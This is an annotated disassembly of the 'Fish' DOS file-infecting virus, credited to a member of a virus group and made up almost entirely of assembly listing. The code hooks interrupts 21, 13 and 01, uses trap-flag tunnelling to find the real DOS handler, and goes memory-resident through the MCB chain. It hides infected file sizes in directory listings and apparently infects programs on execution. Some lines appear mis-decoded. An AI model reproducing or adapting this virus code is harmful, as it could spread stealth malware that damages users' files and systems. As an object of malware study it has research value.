Variabes:

    Runtime Program
    Offset  Offset  Size    Meaning

    0D51    0E91    Byte    Encription Argument
    0E2D            DWord   Pointer To Old INT 21
                    DWord   Pointer To Old INT 13
    0E2F            Word    Return Form INT 01 Segment
    0E31            Word    Some Kind of Random Value
    0E39            DWord   Pointer To Old INT 13
    0E47            Word    Segment of First MCB
    0E50            Byte    Command For ISR #01:
                        00
                        01
                        02
    0E54            Word    DS
    0EDD            Word    SS
    0EDF            Word    SP
    0EE3            Word    BCD (AL)
    0F5B            Word    1000

Subrutines:

       Offset   Name                    Inputs              Outputs

        0161    Call INT 21
        016C    Push All Registers      -                   -
        017F    Pop  All Registers      -                   -
        0197    Set Stack & PopA        -                   -
        01BC    Set Stack & PushA       -                   -
        01E2    Wap Jump To Fish's 21   -                   -
        01FF    Set INT 01 ISR          -                   -
                To CS:0CB7 (0DF7)
        020A    Point ISR To DS:BX      AL = Int Number
                                        DX = ISR Offset
                                        DS = ISR Segment
        0220    Make ES:BX -> ISR       AL = Int Number     ES = ISR Sgement
                                                            BX = ISR Offset
        04ED    Make [0E31] Random      -                   -
                Skeep One Byte
        0C97    Make [0E31] Random      -                   -
                Skeep One Byte
        0DD7    Skeep One Byte          -                   -

                    ; Fish Virus. Sourced By Richie++ a GISVI Member

0100 E9 0B 0E                JMP 0F0E                   ; Jump Writed by virus
0103 48                      DEC AX
0104 F6 53 6C                NOT B[BP+DI+06C]
0107 6F                      OUTSW
0108 20 2D                   AND B[DI],CH
010A 20 43 6F                AND B[BP+DI+06F],AL
010D 70 79                   JO 0188
010F 72 69                   JB 017A
0111 67                      DB 067
0112 68 74 20                PUSH 02074
0115 53                      PUSH BX
0116 20 26 20 53             AND B[05320],AH
011A 20 45 6E                AND B[DI+06E],AL
011D 74 65                   JE 0184
011F 72 70                   JB 0191
0121 72 69                   JB 018C
0123 73 65                   JAE 018A
0125 73 2C                   JAE 0153
0127 20 31                   AND B[BX+DI],DH
0129 39 38                   CMP W[BX+SI],DI
012B 38 0A                   CMP B[BP+SI],CL
012D 0D 24 1A                OR AX,01A24
0130 B4 09                   MOV AH,9
0132 BA 03 01                MOV DX,0103
0135 CD 21                   INT 021
0137 CD 20                   INT 020
0139 58                      POP AX
013A 58                      POP AX
013B 58                      POP AX
013C 58                      POP AX
013D 58                      POP AX
013E 58                      POP AX
013F 58                      POP AX
0140 00 E9                   ADD CL,CH
0142 CA 0D EB                RETF 0EB0D
0145 2E 90                   CS NOP
0147 48                      DEC AX
0148 65 6C                   REPC INSB
014A 6C                      INSB
014B 6F                      OUTSW
014C 20 2D                   AND B[DI],CH
014E 20 43 6F                AND B[BP+DI+06F],AL
0151 70 79                   JO 01CC
0153 72 69                   JB 01BE
0155 67                      DB 067
0156 68 74 20                PUSH 02074
0159 53                      PUSH BX
015A 20 26 20 53             AND B[05320],AH
015E 20 45 00                AND B[DI],AL

                        ; Subrutine. Call Algo

0161 9C                      PUSHF
0162 2E FF 1E 35 0E          CS CALL D[0E35]

0167 C3                      RET
0168 00 43 4F                ADD B[BP+DI+04F],AL
016B 44                      INC SP

                        ; Subrutine. Push All Registers Except BP

016C 2E 8F 06 EA 0E          CS POP W[0EEA]             ; Save Return Address
0171 9C                      PUSHF                      ;
0172 50                      PUSH AX                    ;
0173 53                      PUSH BX                    ;
0174 51                      PUSH CX                    ;
0175 52                      PUSH DX                    ;
0176 56                      PUSH SI                    ;
0177 57                      PUSH DI                    ;
0178 1E                      PUSH DS                    ;
0179 06                      PUSH ES                    ; Push A
017A 2E FF 26 EA 0E          CS JMP W[0EEA]             ; Return

                        ; Subrutine. Pop All Registers Except BP

017F 2E 8F 06 EA 0E          CS POP W[0EEA]             ; Save Return Address
0184 07                      POP ES                     ;
0185 1F                      POP DS                     ;
0186 5F                      POP DI                     ;
0187 5E                      POP SI                     ;
0188 5A                      POP DX                     ;
0189 59                      POP CX                     ;
018A 5B                      POP BX                     ;
018B 58                      POP AX                     ;
018C 9D                      POPF                       ; PopA
018D 2E FF 26 EA 0E          CS JMP W[0EEA]             ; Return

0192 53 48 41 52 4B          db 'SHARK'

                        ; Subrutine. Set Stack & PopA

0197 2E 89 26 57 0F          CS MOV W[0F57],SP
019C 2E 8C 16 59 0F          CS MOV W[0F59],SS
01A1 0E                      PUSH CS
01A2 17                      POP SS
01A3 2E 8B 26 5B 0F          CS MOV SP,W[0F5B]
01A8 2E E8 D3 FF             CS CALL 017F               ; Pop All Registers.
01AC 2E 8E 16 59 0F          CS MOV SS,W[0F59]
01B1 2E 89 26 5B 0F          CS MOV W[0F5B],SP
01B6 2E 8B 26 57 0F          CS MOV SP,W[0F57]
01BB C3                      RET

                        ; Subrutine. Set Stack & PushA

01BC 2E 89 26 57 0F          CS MOV W[0F57],SP          ; [0F57] = SP
01C1 2E 8C 16 59 0F          CS MOV W[0F59],SS          ; [0F59] = SS
01C6 0E                      PUSH CS                    ;
01C7 17                      POP SS                     ; SS = CS
01C8 2E 8B 26 5B 0F          CS MOV SP,W[0F5B]          ; SP = [0F5B]
01CD 2E E8 9B FF             CS CALL 016C               ; Push All Registers.
01D1 2E 8E 16 59 0F          CS MOV SS,W[0F59]          ; SS = [0F59]
01D6 2E 89 26 5B 0F          CS MOV W[0F5B],SP          ; [0F5B] = SP
01DB 2E 8B 26 57 0F          CS MOV SP,W[0F57]          ; SP = [0F57]
01E0 C3                      RET                        ; Return
01E1 8C

                        ;  Subrutine.  Swap Jump to Fish's INT 21 or real INT 21

01E2 BE 4B 0E                MOV SI,0E4B                ; SI = 0E4B
01E5 2E C4 3E 35 0E          CS LES DI,[0E35]           ; ES:DI = INT 21 Address
01EA 0E                      PUSH CS                    ;
01EB 1F                      POP DS                     ; DS = CS
01EC FC                      CLD                        ;
01ED B9 05 00                MOV CX,5                   ; CX = 0005
01F0 AC                      LODSB                      ;
01F1 26 86 05                ES XCHG B[DI],AL
01F4 88 44 FF                MOV B[SI-1],AL
01F7 47                      INC DI
01F8 E2 F6                   LOOP 01F0
01FA C3                      RET                        ; Return

01FB 43                      INC BX
01FC 41                      INC CX
01FD 52                      PUSH DX
01FE 50                      PUSH AX

                        ; Subrutine.    Set INT 01 ISR To CS:0CB7  (0DF7)

01FF B0 01                   MOV AL,1                   ; AL = 01
0201 0E                      PUSH CS                    ;
0202 1F                      POP DS                     ; DS = CS
0203 BA B7 0C                MOV DX,0CB7                ; DX = 0CB7
0206 E8 01 00                CALL 020A                  ; Set INT #01 to DS:DX.
0209 C3                      RET

                        ; Subrutine. Set Interrupt Pointer
                        ; Input:
                        ;   AL = Interrupt Number
                        ;   DX = ISR Offset
                        ;   DS = ISR Segment

020A 06                      PUSH ES                    ; Save ES
020B 53                      PUSH BX                    ; Save  BX
020C 33 DB                   XOR BX,BX                  ; BX=0000
020E 8E C3                   MOV ES,BX                  ; ES=0000
0210 8A D8                   MOV BL,AL                  ; BX=AL
0212 D1 E3                   SHL BX,1                   ;
0214 D1 E3                   SHL BX,1                   ;
0216 26 89 17                ES MOV W[BX],DX            ;
0219 26 8C 5F 02             ES MOV W[BX+2],DS          ;
021D 5B                      POP BX                     ;
021E 07                      POP ES                     ;
021F C3                      RET                        ;

                        ; Subrutine. Get INT #AL Pointer In ES:BX

0220 1E                      PUSH DS                    ; Save DS
0221 56                      PUSH SI                    ; Save SI
0222 33 F6                   XOR SI,SI                  ; SI = 0000
0224 8E DE                   MOV DS,SI                  ; DS = 0000
0226 32 E4                   XOR AH,AH                  ; AH = 00
0228 8B F0                   MOV SI,AX                  ; SI = AL
022A D1 E6                   SHL SI,1                   ;
022C D1 E6                   SHL SI,1                   ;
022E 8B 1C                   MOV BX,W[SI]               ;
0230 8E 44 02                MOV ES,W[SI+2]             ;
0233 5E                      POP SI                     ; Restore SI
0234 1F                      POP DS                     ; Restore DS
0235 C3                      RET                        ; Reutnr

0236 42                      INC DX
0237 41                      INC CX
0238 53                      PUSH BX
0239 53                      PUSH BX

                        ; Jumped Here Before Changing Segment And Offsets
                        ; This Will Be CS+14:00FA
                        ; All Relative Offsets Will Apear As Offset-0140
                        ; All Absolute Offsets should be incremented 0140
                        ;     now for interpreting where will they be at
                        ;     runtime.

023A E8 B0 02                CALL 04ED (03AD)           ; Make [0E31]  Random
023D B9                                                 ; Jump 1 Byte
023E E8 56 0A                CALL 0C97 (0B57)           ; Make [0E31]  Random
0241 8E                                                 ; Jump 1 Byte
0242 2E A3 E3 0E             CS MOV W[0EE3],AX          ; [0EE3] = Entry AX
0246 B4 52                   MOV AH,052                 ; AH = 52
0248 2E C7 06 5B 0F 00 10    CS MOV W[0F5B],01000       ; [0F5B] = 1000
024F 2E 8C 1E 45 0E          CS MOV W[0E45],DS          ; [0E54] = DS
0254 E8 80 0B                CALL 0DD7                  ; Skeep One Byte
0257 EB                                                 ; Byte Skeeped
0258 CD 21                   INT 21                     ; Get List Of Lists
025A 26 8B 47 FE             MOV AX,ES:[BX-02]          ; AX = First MCB Segment
025E FE 2E A3 47 0E          MOV CS:[0E47],AX           ; [0E47] = 1� MCB
0262 0E                      PUSH CS                    ;
0263 1F                      POP DS                     ; DS = CS
0264 E8 30 0A                CALL 0C97                  ; Make [0E31] Random
0267 A1                                                 ; Skeep One Byte
0268 B0 21                   MOV AL,21                  ; AL = 21
026A E8 B3 FF                CALL 0220                  ; ES:BX -> INT #21
026D 8C 06 2F 0E             MOV W[0E2F],ES             ;
0271 89 1E 2D 0E             MOV W[0E2D],BX             ; [0E2D] -> Old ISR #21
0275 BA B7 0C                MOV DX,0CB7                ; DX = 0CB7 (0DF7)
0278 B0 01                   MOV AL,1                   ; AL = 01
027A C6 06 50 0E 00          MOV B[0E50],0              ; [0E50] = 00
027F E8 88 FF                CALL 020A                  ; Set INT #01 To CS:0DF7
0282 9C                      PUSHF                      ;
0283 58                      POP AX                     ;
0284 0D 00 01                OR AX,0100                 ;
0287 50                      PUSH AX                    ;
0288 9D                      POPF                       ; Turn On Trap Flag
0289 9C                      PUSHF                      ;
028A B4 61                   MOV AH,061                 ;
028C FF 1E 2D 0E             CALL D[0E2D]               ; INT 21
0290 9C                      PUSHF                      ; Get Real INT 21 Ptr
0291 58                      POP AX                     ;
0292 25 FF FE                AND AX,0FEFF               ;
0295 50                      PUSH AX                    ;
0296 9D                      POPF                       ; Clear Trap Flag
0297 E8 E1 01                CALL 047B                  ; Increment [0E31]
029A A3                                                 ; Skeep Ine Byte
029B C4 3E 2D 0E             LES DI,[0E2D]              ; ES:DI -> INT 21
029F 8C 06 37 0E             MOV [0E37],ES              ; [0E37] = 21's Segment
02A3 C6 06 4B 0E EA          MOV B[0E4B],0EA            ; [0E4B] = EA (JMP FAR)
02A8 C7 06 4C 0E 5B 0D       MOV W[0E4C],0D5B           ; [0E4C] = 0D5B (0E9B)
02AE 89 3E 35 0E             MOV W[0E35],DI             ; [0E35] = 21's Offset
02B2 8C 0E 4E 0E             MOV W[0E4E],CS             ; [0E4E] = CS
                                                        ; Prepare Swaping Buffer
02B6 E8 07 00                CALL 02C0                  ; (*)
02B9 E8 26 FF                CALL 01E2                  ; Swap Jump To INT 21
02BC E8 17 0A                CALL 0CD6
02BF 89
02C0 B0 2F                   MOV AL,2F                  ; AL = 2F
02C2 E8 5B FF                CALL 0220                  ; Make ES:BX -> INT 2F
02C5 8C C3                   MOV BX,ES                  ; BX = INT 2F Segment
02C7 2E 39 1E 47 0E          CS CMP W[0E47],BX          ; 1� MCB >= 2F's Segment
02CC 73 1C                   JAE RET                    ; IF So  Return
02CE E8 3F 0A                CALL 0D10                  ; (*)
02D1 2E 8E 1E 2F 0E          CS MOV DS,W[0E2F]
02D6 2E FF 36 2D 0E          CS PUSH W[0E2D]
02DB 5A                      POP DX
02DC B0 13                   MOV AL,013
02DE E8 29 FF                CALL 020A                  ; Set INT #13 to DS:DX.
02E1 33 DB                   XOR BX,BX
02E3 8E DB                   MOV DS,BX
02E5 C6 06 75 04 02          MOV B[0475],2
02EA C3                      RET
02EB 20 46 49                AND B[BP+049],AL
02EE 53                      PUSH BX
02EF 48                      DEC AX
02F0 20 56 49                AND B[BP+049],DL
02F3 52                      PUSH DX
02F4 55                      PUSH BP
02F5 53                      PUSH BX
02F6 20 23                   AND B[BP+DI],AH
02F8 36 20 2D                SS AND B[DI],CH
02FB 20 45 41                AND B[DI+041],AL
02FE 43                      INC BX
02FF 48                      DEC AX
0300 20 44 49                AND B[SI+049],AL
0303 46                      INC SI
0304 46                      INC SI
0305 20 2D                   AND B[DI],CH
0307 20 42 4F                AND B[BP+SI+04F],AL
030A 4E                      DEC SI
030B 4E                      DEC SI
030C 20 32                   AND B[BP+SI],DH
030E 2F                      DAS
030F 39 30                   CMP W[BX+SI],SI
0311 20 27                   AND B[BX],AH
0313 7E 6B                   JLE 0380
0315 6E                      OUTSB
0316 7A 79                   JPE 0391
0318 76 6F                   JBE 0389
031A 7D 27                   JGE 0343
031C 24 E8                   AND AL,0E8
031E C2 FE 2E                RET 02EFE
0321 8C 0E 4E 0E             MOV W[0E4E],CS
0325 E8 BA FE                CALL 01E2                  ; Swap Jump To INT 21
0328 0E                      PUSH CS
0329 1F                      POP DS
032A 1E                      PUSH DS
032B 07                      POP ES
032C A1 45 0E                MOV AX,W[0E45]
032F 8E C0                   MOV ES,AX
0331 26 C5 16 0A 00          ES LDS DX,[0A]
0336 8E D8                   MOV DS,AX
0338 05 10 00                ADD AX,010
033B 2E 01 06 1A 00          CS ADD W[01A],AX
0340 2E 80 3E 20 00 00       CS CMP B[020],0
0346 FB                      STI
0347 75 24                   JNE 036D
0349 2E A1 04 00             CS MOV AX,W[4]
034D A3 00 01                MOV W[0100],AX
0350 2E A1 06 00             CS MOV AX,W[6]
0354 A3 02 01                MOV W[0102],AX
0357 2E A1 08 00             CS MOV AX,W[8]
035B A3 04 01                MOV W[0104],AX
035E 2E FF 36 45 0E          CS PUSH W[0E45]
0363 33 C0                   XOR AX,AX
0365 FE C4                   INC AH
0367 50                      PUSH AX
0368 2E A1 E3 0E             CS MOV AX,W[0EE3]
036C CB                      RETF
036D 2E 01 06 12 00          CS ADD W[012],AX
0372 2E A1 E3 0E             CS MOV AX,W[0EE3]
0376 2E 8B 26 14 00          CS MOV SP,W[014]
037B 2E 8E 16 12 00          CS MOV SS,W[012]
0380 2E FF 2E 18 00          CS JMP D[018]
0385 54                      PUSH SP
0386 52                      PUSH DX
0387 4F                      DEC DI
0388 55                      PUSH BP
0389 54                      PUSH SP

                        ; Decripted Program Start. Here Start Real Virus

038A 33 E4                   XOR SP,SP                  ; SP=0000
038C E8 00 00                CALL 038F                  ; Stack=038F
038F 89 C5                   MOV BP,AX                  ; BP=AX at Entry
0391 8C C8                   MOV AX,CS                  ; AX=CS
0393 BB 10 00                MOV BX,010                 ; BX=0010
0396 F7 E3                   MUL BX                     ; DX:AX=CS*10h
0398 59                      POP CX                     ; CX=038F
0399 81 E9 4F 02             SUB CX,024F                ; CX=0140
039D 03 C1                   ADD AX,CX                  ; DX:AX=CS:0140 but
039F 83 D2 00                ADC DX,0                   ; lower offset posible
03A2 F7 F3                   DIV BX                     ; means: CS+14:0000
03A4 50                      PUSH AX                    ; AX=CS+14
03A5 B8 FA 00                MOV AX,0FA                 ; AX=00FA
03A8 50                      PUSH AX                    ; Stack=CS+140:00FA
03A9 89 E8                   MOV AX,BP                  ; AX=Entry AX
03AB CB                      RETF                       ; Jump to CS:023A

03AC E8 CC 00                CALL 047B
03AF CD E8                   INT 0E8
03B1 24 0A                   AND AL,0A
03B3 CB                      RETF
03B4 53                      PUSH BX
03B5 8B DC                   MOV BX,SP
03B7 36 8B 5F 06             SS MOV BX,W[BX+6]
03BB 2E 89 1E B3 0E          CS MOV W[0EB3],BX
03C0 5B                      POP BX
03C1 55                      PUSH BP
03C2 89 E5                   MOV BP,SP
03C4 E8 D0 08                CALL 0C97                  ; Make [0E31] Random
                                                        ; Skeep One Byte
03C7 A3 E8 F1                MOV W[0F1E8],AX
03CA FD                      STD
03CB E8 14 FE                CALL 01E2                  ; Swap Jump To INT 21
03CE E8 C6 FD                CALL 0197                  ; Set Stack & PopA.
03D1 E8 98 FD                CALL 016C                  ; Push All Registers.
03D4 E8 C0 08                CALL 0C97                  ; Make [0E31] Random
                                                        ; Skeep One Byte
03D7 88 80 FC 0F             MOV B[BX+SI+0FFC],AL
03DB 75 04                   JNE 03E1
03DD E9 E9 00                JMP 04C9
03E0 B8 80 FC                MOV AX,0FC80
03E3 11 75 04                ADC W[DI+4],SI
03E6 E9 9B 00                JMP 0484
03E9 A1 80 FC                MOV AX,W[0FC80]
03EC 12 75 04                ADC DH,B[DI+4]
03EF E9 92 00                JMP 0484
03F2 89 80 FC 14             MOV W[BX+SI+014FC],AX
03F6 75 04                   JNE 03FC
03F8 E9 09 01                JMP 0504
03FB EB 80                   JMP 037D
03FD FC                      CLD
03FE 21 75 04                AND W[DI+4],SI
0401 E9 F4 00                JMP 04F8
0404 8C 80 FC 23             MOV W[BX+SI+023FC],ES
0408 75 04                   JNE 040E
040A E9 84 01                JMP 0591
040D A3 80 FC                MOV W[0FC80],AX
0410 27                      DAA
0411 75 04                   JNE 0417
0413 E9 E0 00                JMP 04F6
0416 EB 80                   JMP 0398
0418 FC                      CLD
0419 3D 75 04                CMP AX,0475
041C E9 C6 01                JMP 05E5
041F FF 80 FC 3E             INC W[BX+SI+03EFC]
0423 75 04                   JNE 0429
0425 E9 01 02                JMP 0629
0428 A1 80 FC                MOV AX,W[0FC80]
042B 3F                      AAS
042C 75 04                   JNE 0432
042E E9 7D 07                JMP 0BAE
0431 88 80 FC 42             MOV B[BX+SI+042FC],AL
0435 75 04                   JNE 043B
0437 E9 42 07                JMP 0B7C
043A 8C 80 FC 4B             MOV W[BX+SI+04BFC],ES
043E 75 04                   JNE 0444
0440 E9 1C 02                JMP 065F
0443 EB 80                   JMP 03C5
0445 FC                      CLD
0446 4E                      DEC SI
0447 75 04                   JNE 044D
0449 E9 53 08                JMP 0C9F
044C 89 80 FC 4F             MOV W[BX+SI+04FFC],AX
0450 75 04                   JNE 0456
0452 E9 4A 08                JMP 0C9F
0455 8E 80 FC 57             MOV ES,W[BX+SI+057FC]
0459 75 03                   JNE 045E
045B E9 CF 06                JMP 0B2D
045E E9 57 09                JMP 0DB8
0461 EB E8                   JMP 044B
0463 72 09                   JB 046E
0465 A1 E8 53                MOV AX,W[053E8]
0468 FD                      STD
0469 E8 76 FD                CALL 01E2                  ; Swap Jump To INT 21
046C E8 28 FD                CALL 0197                  ; Set Stack & PopA.

046F 89 E5                   MOV BP,SP
0471 2E FF 36 B3 0E          CS PUSH W[0EB3]
0476 8F 46 06                POP W[BP+6]
0479 5D                      POP BP
047A CF                      IRET

                        ; Called with CALL

047B 2E FF 06 31 0E          CS INC W[0E31]             ; [0E31]++
0480 E9 14 08                JMP 0C97                   ;  0C97

0483 A1 E8 F8                MOV AX,W[0F8E8]
0486 FC                      CLD
0487 E8 D7 FC                CALL 0161                  ; INT 21
048A 0A C0                   OR AL,AL
048C 75 D4                   JNE 0462
048E E8 DB FC                CALL 016C                  ; Push All Registers.
0491 E8 C1 01                CALL 0655
0494 B0 00                   MOV AL,0
0496 80 3F FF                CMP B[BX],0FF
0499 75 06                   JNE 04A1
049B 8A 47 06                MOV AL,B[BX+6]
049E 83 C3 07                ADD BX,7
04A1 2E 20 06 F0 0E          CS AND B[0EF0],AL
04A6 F6 47 1A 80             TEST B[BX+01A],080
04AA 74 15                   JE 04C1
04AC 80 6F 1A C8             SUB B[BX+01A],0C8
04B0 2E 80 3E F0 0E 00       CS CMP B[0EF0],0
04B6 75 09                   JNE 04C1
04B8 81 6F 1D 00 0E          SUB W[BX+01D],0E00
04BD 83 5F 1F 00             SBB W[BX+01F],0
04C1 E8 BB FC                CALL 017F                  ; Pop All Registers.
04C4 EB 9C                   JMP 0462
04C6 46                      INC SI
04C7 49                      DEC CX
04C8 4E                      DEC SI
04C9 E8 B3 FC                CALL 017F                  ; Pop All Registers.
04CC E8 92 FC                CALL 0161                  ; INT 21
04CF E8 9A FC                CALL 016C                  ; Push All Registers.
04D2 0A C0                   OR AL,AL
04D4 75 EB                   JNE 04C1
04D6 89 D3                   MOV BX,DX
04D8 F6 47 15 80             TEST B[BX+015],080
04DC 74 E3                   JE 04C1
04DE 80 6F 15 C8             SUB B[BX+015],0C8
04E2 81 6F 10 00 0E          SUB W[BX+010],0E00
04E7 80 5F 12 00             SBB B[BX+012],0
04EB EB D4                   JMP 04C1

                        ; Subrutine? Called from 023A

04ED 2E FF 0E 31 0E          CS DEC W[0E31]             ; [0F71]--
04F2 E9 A2 07                JMP 0C97                   ;  0C97 (0B57)

04F5 A3 E3 1B                MOV W[01BE3],AX
04F8 89 D3                   MOV BX,DX
04FA 8B 77 21                MOV SI,W[BX+021]
04FD 0B 77 23                OR SI,W[BX+023]
0500 75 11                   JNE 0513
0502 EB 0A                   JMP 050E
0504 89 D3                   MOV BX,DX
0506 8B 47 0C                MOV AX,W[BX+0C]
0509 0A 47 20                OR AL,B[BX+020]
050C 75 05                   JNE 0513
050E E8 E3 04                CALL 09F4
0511 73 03                   JAE 0516
0513 E9 48 FF                JMP 045E
0516 E8 66 FC                CALL 017F                  ; Pop All Registers.
0519 E8 50 FC                CALL 016C                  ; Push All Registers.
051C E8 42 FC                CALL 0161                  ; INT 21
051F 89 4E F8                MOV W[BP-8],CX
0522 89 46 FC                MOV W[BP-4],AX
0525 1E                      PUSH DS
0526 52                      PUSH DX
0527 E8 2B 01                CALL 0655
052A 83 7F 14 01             CMP W[BX+014],1
052E 74 1B                   JE 054B
0530 8B 07                   MOV AX,W[BX]
0532 03 47 02                ADD AX,W[BX+2]
0535 53                      PUSH BX
0536 8B 5F 04                MOV BX,W[BX+4]
0539 F7 D3                   NOT BX
053B 01 D8                   ADD AX,BX
053D 5B                      POP BX
053E 74 0B                   JE 054B
0540 83 C4 04                ADD SP,4
0543 E9 7B FF                JMP 04C1
0546 4D                      DEC BP
0547 55                      PUSH BP
0548 53                      PUSH BX
0549 4B                      DEC BX
054A 59                      POP CX
054B 5A                      POP DX
054C 1F                      POP DS
054D 89 D6                   MOV SI,DX
054F 0E                      PUSH CS
0550 07                      POP ES
0551 B9 25 00                MOV CX,025
0554 BF B5 0E                MOV DI,0EB5
0557 F3 A4                   REP MOVSB
0559 BF B5 0E                MOV DI,0EB5
055C 0E                      PUSH CS
055D 1F                      POP DS
055E 8B 55 12                MOV DX,W[DI+012]
0561 8B 45 10                MOV AX,W[DI+010]
0564 05 0F 0E                ADD AX,0E0F
0567 83 D2 00                ADC DX,0
056A 25 F0 FF                AND AX,-010
056D 89 55 12                MOV W[DI+012],DX
0570 89 45 10                MOV W[DI+010],AX
0573 2D FC 0D                SUB AX,0DFC
0576 83 DA 00                SBB DX,0
0579 89 55 23                MOV W[DI+023],DX
057C 89 45 21                MOV W[DI+021],AX
057F B9 1C 00                MOV CX,01C
0582 C7 45 0E 01 00          MOV W[DI+0E],1
0587 B4 27                   MOV AH,027
0589 89 FA                   MOV DX,DI
058B E8 D3 FB                CALL 0161                  ; INT 21
058E E9 30 FF                JMP 04C1
0591 0E                      PUSH CS
0592 07                      POP ES
0593 BF B5 0E                MOV DI,0EB5
0596 B9 25 00                MOV CX,025
0599 89 D6                   MOV SI,DX
059B F3 A4                   REP MOVSB
059D 1E                      PUSH DS
059E 52                      PUSH DX
059F 0E                      PUSH CS
05A0 1F                      POP DS
05A1 B4 0F                   MOV AH,0F
05A3 BA B5 0E                MOV DX,0EB5
05A6 E8 B8 FB                CALL 0161                  ; INT 21
05A9 B4 10                   MOV AH,010
05AB E8 B3 FB                CALL 0161                  ; INT 21
05AE F6 06 CA 0E 80          TEST B[0ECA],080
05B3 5E                      POP SI
05B4 1F                      POP DS
05B5 74 2B                   JE 05E2
05B7 2E C4 1E C5 0E          CS LES BX,[0EC5]
05BC 8C C0                   MOV AX,ES
05BE 81 EB 00 0E             SUB BX,0E00
05C2 1D 00 00                SBB AX,0
05C5 33 D2                   XOR DX,DX
05C7 2E 8B 0E C3 0E          CS MOV CX,W[0EC3]
05CC 49                      DEC CX
05CD 01 CB                   ADD BX,CX
05CF 15 00 00                ADC AX,0
05D2 41                      INC CX
05D3 F7 F1                   DIV CX
05D5 89 44 23                MOV W[SI+023],AX
05D8 92                      XCHG AX,DX
05D9 93                      XCHG AX,BX
05DA F7 F1                   DIV CX
05DC 89 44 21                MOV W[SI+021],AX
05DF E9 DF FE                JMP 04C1
05E2 E9 79 FE                JMP 045E
05E5 E8 6C 04                CALL 0A54
05E8 E8 15 04                CALL 0A00
05EB 72 39                   JB 0626
05ED 2E 80 3E A2 0E 00       CS CMP B[0EA2],0
05F3 74 31                   JE 0626
05F5 E8 69 04                CALL 0A61
05F8 83 FB FF                CMP BX,-1
05FB 74 29                   JE 0626
05FD 2E FE 0E A2 0E          CS DEC B[0EA2]
0602 0E                      PUSH CS
0603 07                      POP ES
0604 B9 14 00                MOV CX,014
0607 BF 52 0E                MOV DI,0E52
060A 33 C0                   XOR AX,AX
060C F2 AF                   REPNE SCASW
060E 2E A1 A3 0E             CS MOV AX,W[0EA3]
0612 26 89 45 FE             ES MOV W[DI-2],AX
0616 26 89 5D 26             ES MOV W[DI+026],BX
061A 89 5E FC                MOV W[BP-4],BX
061D 2E 80 26 B3 0E FE       CS AND B[0EB3],0FE
0623 E9 9B FE                JMP 04C1
0626 E9 35 FE                JMP 045E
0629 0E                      PUSH CS
062A 07                      POP ES
062B E8 26 04                CALL 0A54
062E B9 14 00                MOV CX,014
0631 2E A1 A3 0E             CS MOV AX,W[0EA3]
0635 BF 52 0E                MOV DI,0E52
0638 F2 AF                   REPNE SCASW
063A 75 16                   JNE 0652
063C 26 3B 5D 26             ES CMP BX,W[DI+026]
0640 75 F6                   JNE 0638
0642 26 C7 45 FE 00 00       ES MOV W[DI-2],0
0648 E8 17 02                CALL 0862
064B 2E FE 06 A2 0E          CS INC B[0EA2]
0650 EB CB                   JMP 061D
0652 E9 09 FE                JMP 045E
0655 B4 2F                   MOV AH,02F
0657 06                      PUSH ES
0658 E8 06 FB                CALL 0161                  ; INT 21
065B 06                      PUSH ES
065C 1F                      POP DS
065D 07                      POP ES
065E C3                      RET
065F 0A C0                   OR AL,AL
0661 74 03                   JE 0666
0663 E9 56 01                JMP 07BC
0666 1E                      PUSH DS
0667 52                      PUSH DX
0668 2E 8C 06 26 0E          CS MOV W[0E26],ES
066D 2E 89 1E 24 0E          CS MOV W[0E24],BX
0672 2E C5 36 24 0E          CS LDS SI,[0E24]
0677 B9 0E 00                MOV CX,0E
067A BF F1 0E                MOV DI,0EF1
067D 0E                      PUSH CS
067E 07                      POP ES
067F F3 A4                   REP MOVSB
0681 5E                      POP SI
0682 1F                      POP DS
0683 B9 50 00                MOV CX,050
0686 BF 07 0F                MOV DI,0F07
0689 F3 A4                   REP MOVSB
068B BB FF FF                MOV BX,-1
068E E8 EE FA                CALL 017F                  ; Pop All Registers.
0691 5D                      POP BP
0692 2E 8F 06 E6 0E          CS POP W[0EE6]
0697 2E 8F 06 E8 0E          CS POP W[0EE8]
069C 2E 8F 06 B3 0E          CS POP W[0EB3]
06A1 0E                      PUSH CS
06A2 B8 01 4B                MOV AX,04B01
06A5 07                      POP ES
06A6 9C                      PUSHF
06A7 BB F1 0E                MOV BX,0EF1
06AA 2E FF 1E 35 0E          CS CALL D[0E35]
06AF 73 20                   JAE 06D1
06B1 2E 83 0E B3 0E 01       CS OR W[0EB3],1
06B7 2E FF 36 B3 0E          CS PUSH W[0EB3]
06BC 2E FF 36 E8 0E          CS PUSH W[0EE8]
06C1 2E FF 36 E6 0E          CS PUSH W[0EE6]
06C6 55                      PUSH BP
06C7 2E C4 1E 24 0E          CS LES BX,[0E24]
06CC 89 E5                   MOV BP,SP
06CE E9 91 FD                JMP 0462
06D1 E8 80 03                CALL 0A54
06D4 0E                      PUSH CS
06D5 07                      POP ES
06D6 B9 14 00                MOV CX,014
06D9 BF 52 0E                MOV DI,0E52
06DC 2E A1 A3 0E             CS MOV AX,W[0EA3]
06E0 F2 AF                   REPNE SCASW
06E2 75 0D                   JNE 06F1
06E4 26 C7 45 FE 00 00       ES MOV W[DI-2],0
06EA 2E FE 06 A2 0E          CS INC B[0EA2]
06EF EB EB                   JMP 06DC
06F1 2E C5 36 03 0F          CS LDS SI,[0F03]
06F6 83 FE 01                CMP SI,1
06F9 75 34                   JNE 072F
06FB 8B 16 1A 00             MOV DX,W[01A]
06FF 83 C2 10                ADD DX,010
0702 B4 51                   MOV AH,051
0704 E8 5A FA                CALL 0161                  ; INT 21
0707 03 D3                   ADD DX,BX
0709 2E 89 16 05 0F          CS MOV W[0F05],DX
070E FF 36 18 00             PUSH W[018]
0712 2E 8F 06 03 0F          CS POP W[0F03]
0717 03 1E 12 00             ADD BX,W[012]
071B 83 C3 10                ADD BX,010
071E 2E 89 1E 01 0F          CS MOV W[0F01],BX
0723 FF 36 14 00             PUSH W[014]
0727 2E 8F 06 FF 0E          CS POP W[0EFF]
072C E9 28 00                JMP 0757
072F 8B 04                   MOV AX,W[SI]
0731 03 44 02                ADD AX,W[SI+2]
0734 53                      PUSH BX
0735 8B 5C 04                MOV BX,W[SI+4]
0738 F7 D3                   NOT BX
073A 01 D8                   ADD AX,BX
073C 5B                      POP BX
073D 74 61                   JE 07A0
073F 0E                      PUSH CS
0740 1F                      POP DS
0741 BA 07 0F                MOV DX,0F07
0744 E8 B9 02                CALL 0A00
0747 E8 17 03                CALL 0A61
074A 2E FE 06 EF 0E          CS INC B[0EEF]
074F E8 10 01                CALL 0862
0752 2E FE 0E EF 0E          CS DEC B[0EEF]
0757 B4 51                   MOV AH,051
0759 E8 05 FA                CALL 0161                  ; INT 21
